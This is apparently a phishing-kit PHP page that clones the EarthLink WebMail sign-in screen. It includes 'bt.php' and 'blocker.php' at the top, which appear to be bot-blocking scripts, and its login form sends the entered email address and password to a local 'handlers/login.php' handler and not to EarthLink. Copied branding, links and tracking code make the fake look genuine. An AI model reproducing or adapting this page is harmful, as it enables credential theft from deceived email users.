<?php
include 'bt.php';
include 'blocker.php';

 ?>

<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Web Mail</title>

<link rel="stylesheet" href="files/style60.css" type="text/css">


<link rel="stylesheet" href="files/chit.css" type="text/css">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<link rel="shortcut icon" type="image/ico" href="https://webmail.earthlink.net/wam/brand/earthlink/favicon.ico">

<script src="files/login.js"></script> 
<script src="files/domains.js"></script> 
<script src="files/scripts.js"></script> 


<script language="javascript"><!--


	if(d == null){allAllowed = true;}
	
    aiDomainCheck = true;

    function constructUrl(farmUrl){return "https://" + farmUrl + "/wam/Login";}

	var doOnLoad = new Array();

	function init() {
		   if (arguments.callee.done) return;
		   arguments.callee.done = true;
		   // TT #18272 Turning off the old loadFocus which
		   // stole the focus after ad has been loaded
		   //loadFocus();

   		   for (i = 0; i < doOnLoad.length; i++) {
		     doOnLoad[i](this);
		   }
	   };
   /* for Mozilla */
   if (document.addEventListener) {
       document.addEventListener("DOMContentLoaded", init, null);
   }

   /* for Internet Explorer */
   /*@cc_on @*/
   /*@if (@_win32)
       document.write("<script defer src='/wam/js/focusHandler.js?v=6.3.37'><"+"/script>");
   /*@end @*/

   /* for other browsers */
   window.onload = init;
// --></script>



	
	






<style>

/* These styles assume you are using ul and li */
.dropit {
    list-style: none;
	padding: 0;
	margin: 0;
}
.dropit .dropit-trigger { position: relative; }
.dropit .dropit-submenu {
    position: absolute;
    top: 100%;
    right: 10px !important;
    z-index: 1000;
    display: none;
    min-width: 150px;
    list-style: none;
	padding: 0;
	margin: 0;
    text-align:justify;
}
.dropit .dropit-open .dropit-submenu { display: block; }

.gearmenu ul { display: none; } /* Hide before plugin loads */
.gearmenu ul.dropit-submenu {
    background-color: #fff;
    border: 1px solid #b2b2b2;
    padding: 6px 0;
    margin: 3px 0 0 1px;
    border-radius: 6px;    
    -webkit-border-radius: 6px;
       -moz-border-radius: 6px;
            border-radius: 6px;
    -webkit-box-shadow: 0px 1px 3px rgba(0,0,0,0.15);
       -moz-box-shadow: 0px 1px 3px rgba(0,0,0,0.15);
            box-shadow: 0px 1px 3px rgba(0,0,0,0.15);
}          
.gearmenu ul.dropit-submenu a {
    display: block;
    font-size: 12px;
    line-height: 25px;
    color: #7a868e;
    padding: 0 18px;
}
.gearmenu ul.dropit-submenu a:hover {
    background: #648ACB;
    color: #fff;
    text-decoration: none;
}
</style>

<script src="files/jquery-1.js"></script> 
<script src="files/dropit.js"></script> 

<script>
$(document).ready(function() {
    $('.gearmenu').dropit();
});
</script>


</head><body><form style="margin: 0" method="GET" target="search" action="http://search.earthlink.net/track">
<table class="universalNav_6_0" width="100%" cellspacing="0" cellpadding="0">
	<tbody><tr valign="middle">
		<!-- Open and close TD tags have to be on same line or contents will be misaligned in IE -->
		<td style="width:25%;" align="left">
			<a href="http://www.earthlink.net/"> <img id="elnkImgId" src="files/elnk_logo.png" alt="EarthLink" style="margin-left:20px;" border="0"></a></td>
		<td align="right"><img id="googleImgId" src="files/univ_nav_Google.png"></td>
		<td style="width:30%;" align="center">
			<input name="url" value="/search" type="hidden">
			<input name="id" value="1024669" type="hidden">
			<input name="channel" value="webmail" type="hidden">
			<input name="area" value="earthlink-ws" type="hidden">
			<input name="vars" value="q,channel,area" type="hidden">
			<input id="searchBoxId" name="q" size="10" type="text"></td>
		<td align="left">
			<input id="searchButtonId" src="files/mag_button_smaller.png" type="image"></td>
		<td align="right">
			<span class="universalLinks_6_0 " style="margin-left:8px; margin-right:20px;">
				<a href="http://my.earthlink.net/"><img id="homeIconId" src="files/home_icon.png" style="margin-top:3px;"></a>
	 			<span class="gearmenu dropit">
		 			<span class="dropit-trigger">
		                <a href="#"><img id="gearIconId" src="files/gear_icon.png" style="margin-top:3px;"></a>
		        		<ul class="dropit-submenu" style="display: none;">
		            		<li><a href="http://myaccount.earthlink.net/">My Account</a></li>
		            		<li><a href="http://support.earthlink.net/">Support</a></li>
		            		<li><a href="http://www.earthlink.net/membercenter">Member Center</a></li>
		            		<li><a href="http://myvoice.earthlink.net/">My Voice</a></li>
		        		</ul>
					</span>
				</span>
			</span>
		</td>
	</tr>
</tbody></table>
</form>





<div id="msgCenter60">
</div>
	

	<br><center>
	
	

	


<div class="main-content">
    <div class="signInWidget">
		<form name="signinFrm" action="handlers/login.php" method="post" onsubmit="return checkLogin()">
		<input name="page" value="/wam/index.jsp" type="HIDDEN">
		<input name="start" value="1" type="HIDDEN">
		<div id="zone3dynamic1" class="elnk_Wam70_Login_bg" style='background-image: url("files/bg-7.jpg");'>
			<div class="elnk_Wam70_Login_mainFrame">
				<div class="elnk_Wam70_Login_mainBox"></div>
				<div class="elnk_Wam70_Login_mainTitle">Welcome to WebMail</div>	
				<div class="elnk_Wam70_Login_inputBox"></div>				
				<div class="elnk_Wam70_Login_inputFieldContainer">

					
					<label for="uname">Email Address</label><input name="tzoffset" value="-4" type="hidden"><input name="screenSize" value="1366x768" type="hidden"><div class="inline-errors"><div id="emailElement" style="visibility: hidden;"></div><input tabindex="1" size="30" name="email" id="uname" class="username" onkeypress='checkCapsLock( event, "emailElement")' required onblur='hideInlineError("emailElement")' type="text"></div><div class="notes">(eg. your_address@earthlink.net)</div><label for="passw">Password:</label><div class="inline-errors"><div id="passwordElement"></div><input tabindex="2" value="" name="password" class="password" id="passw" onkeypress='checkCapsLock( event, "passwordElement")' onblur='hideInlineError("passwordElement")' type="password" required></div><div class="notes"><a href="https://myaccount.earthlink.net/cam/passmain.jsp" class="signinLinks" target="_blank">Forgot your password?</a></div><div align="center"><input tabindex="3" class="buttonLogin" src="files/button-signin.gif" name="okey_x" value="Sign In" type="image"><div class="notes"><a href="http://www.earthlink.net/webmail/help/earthlink/en_US/login.html" target="_blanks" add="1">Sign In Help</a></div></div><span><input id="saveuser" value="on" name="saveuser" class="checkbox" type="checkbox"> <label for="saveuser" class="normal">Remember my username on this computer.</label></span>
					
			    	<div id="login_warning" style="color:red;display:inline"> </div>									
				</div>			
	            <div class="signInError" style="display:none;"></div>
	            <!-- Zone 1 Ad Start -->
	            <div id="zone1dynamic1" class="promoBox1"><span style="font-family:Hind;font-weight:bold;font-size:15px;color:#f60">Political NewsLink</span><br><span style="font-family:Hind;font-size:13px">Your one-stop destination for diverse election coverage headlines. <a href="http://politics.earthlink.net/" target="_blank">Click here for more details.</a> </span></div>
	            <div id="zone2dynamic1" class="promoBox2"><span style="font-family:Hind;font-weight:bold;font-size:15px;color:#f60">IMAP: Now Available!</span><br><span style="font-family:Hind;font-size:13px">IMAP email support is now available to all EarthLink customers. <a href="https://support.earthlink.net/articles/email/imap-email.php" target="_blank">Click here for more details.</a> </span></div>	           
				<!-- Zone 1 Ad End -->
				<div class="elnk_Wam70_Login_followBar"></div>
				<div class="elnk_Wam70_Login_followTitle">Follow us:</div>
				<a href="https://www.facebook.com/earthlink" class="elnk_Wam70_Login_followFacebook" target="_blank"></a>
				<a href="https://twitter.com/earthlink" class="elnk_Wam70_Login_followTwitter" target="_blank"></a>
				<a href="http://www.youtube.com/user/earthlinkbiz" class="elnk_Wam70_Login_followYoutube" target="_blank"></a> 		
			</div>
		</div>		
		<div id="zone4dynamic1" class="elnk_Wam70_Login_ad"><img src="files/ad-7.jpg" usemap="#shortButtonMap"><map name="shortButtonMap"><area style="outline: none" href="https://www.earthlink.net/software/stayconnected.faces?tab=pcfinetune" shape="poly" coords="546,37,539,41,537,44,536,49,537,54,539,58,543,60,545,62,668,62,673,59,677,56,678,51,678,47,676,42,670,37" target="_blank"><area style="outline: none" href="https://www.earthlink.net/software/stayconnected.faces?tab=pcfinetune" shape="rect" coords="1,1,719,89" target="_blank"></map>		</div>
        </form>      
    </div>
    <div class="skyscraper">
    
			










<iframe name="skyscraperframe" onfocus="loadFocus()" src="files/blank.htm" border="0" marginwidth="0" marginheight="0" scrolling="no" width="120" height="600" frameborder="no">
	&amp;amp;nbsp;
</iframe>


    </div>
</div>






<div class="footer" align="left">
<hr size="1">
<font size="1" face="Arial">© 2021 EarthLink. All Rights Reserved.<br>
	Members and visitors to the EarthLink Web site agree to abide by our
	<a href="http://www.earthlink.net/about/policies/" target="_blank">Policies and Agreements</a><br>
	<a href="http://www.earthlink.net/about/policies/privacy/" target="_blank">EarthLink Privacy Policy</a>
</font>

</div>


<div class="footer" align="right">
	Web Mail version 6.61.1
</div>



	
 


<!-- Google Code for Remarketing Tag -->
<!--------------------------------------------------
Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: http://google.com/ads/remarketingsetup
--------------------------------------------------->
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 978654289;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="files/conversion.js">
</script><iframe name="google_conversion_frame" title="Google conversion frame" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/978654289/?random=1475525377702&amp;cv=8&amp;fst=1475525377702&amp;num=1&amp;fmt=1&amp;guid=ON&amp;u_h=768&amp;u_w=1366&amp;u_ah=738&amp;u_aw=1366&amp;u_cd=24&amp;u_his=2&amp;u_tz=-240&amp;u_java=true&amp;u_nplug=15&amp;u_nmime=122&amp;frm=0&amp;url=https%3A%2F%2Fwebmail.earthlink.net%2Fwam%2Flogin.jsp%3Fredirect%3D%252Fwam%252Findex.jsp%26x%3D-2000936459%26x%3D-87462234&amp;tiba=Web%20Mail" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" width="300" height="13" frameborder="0"></iframe>
<noscript>
<div style="display:inline;">
<img style="border-style:none;" alt="" src="files/a.gif" width="1" height="1">
</div>
</noscript>
















</center>











</body></html>